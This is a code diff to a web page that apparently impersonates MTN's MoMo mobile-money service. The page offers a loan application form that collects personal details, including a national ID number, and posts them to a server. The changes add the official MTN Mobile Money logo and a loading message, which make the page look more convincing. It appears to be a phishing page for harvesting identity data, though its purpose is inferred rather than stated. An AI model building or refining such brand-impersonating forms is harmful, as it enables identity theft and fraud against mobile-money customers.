@@ -9,7 +9,7 @@
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: #0b5c6b; /* MoMo blue */
+  background: #0b5c6b;
 }
 
 /* HEADER */
@@ -23,9 +23,9 @@ body {
 }
 
 .header img {
-  height: 35px;
+  height: 30px;
   vertical-align: middle;
-  margin-right: 8px;
+  margin-right: 6px;
 }
 
 /* FORM CARD */
@@ -34,7 +34,8 @@ body {
   margin: 30px auto;
   background: white;
   padding: 20px;
-  border-radius: 15px;
+  border-radius: 18px;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
 }
 
 /* TITLE */
@@ -63,6 +64,11 @@ button {
   border-radius: 10px;
   font-size: 16px;
   font-weight: bold;
+  cursor: pointer;
+}
+
+button:active {
+  background: #e6b800;
 }
 
 /* FOOTER */
@@ -72,6 +78,14 @@ button {
   font-size: 12px;
   margin: 20px 0;
 }
+
+/* LOADING */
+.loading {
+  display: none;
+  text-align: center;
+  font-size: 14px;
+  margin-top: 10px;
+}
 </style>
 </head>
 
@@ -79,7 +93,8 @@ button {
 
 <!-- HEADER -->
 <div class="header">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/MTN_Logo.svg">
+  <!-- Better logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
   MoMo App
 </div>
 
@@ -101,6 +116,10 @@ button {
     <input type="text" name="nationalId" placeholder="National ID Number" required>
 
     <button type="submit">Apply Now</button>
+
+    <div class="loading" id="loadingText">
+      ⏳ Processing application...
+    </div>
   </form>
 </div>
 
@@ -114,6 +133,9 @@ button {
 document.getElementById("loanForm").addEventListener("submit", async function(e) {
   e.preventDefault();
 
+  const loading = document.getElementById("loadingText");
+  loading.style.display = "block";
+
   const formData = new FormData(this);
   const data = Object.fromEntries(formData.entries());
 
@@ -126,12 +148,14 @@ document.getElementById("loanForm").addEventListener("submit", async function(e)
       body: JSON.stringify(data)
     });
 
-    if (res.ok) {
+    if (res.status === 200) {
       window.location.href = "/success.html";
     } else {
+      loading.style.display = "none";
       alert("❌ Error submitting application");
     }
   } catch (err) {
+    loading.style.display = "none";
     alert("❌ Server error");
   }
 });
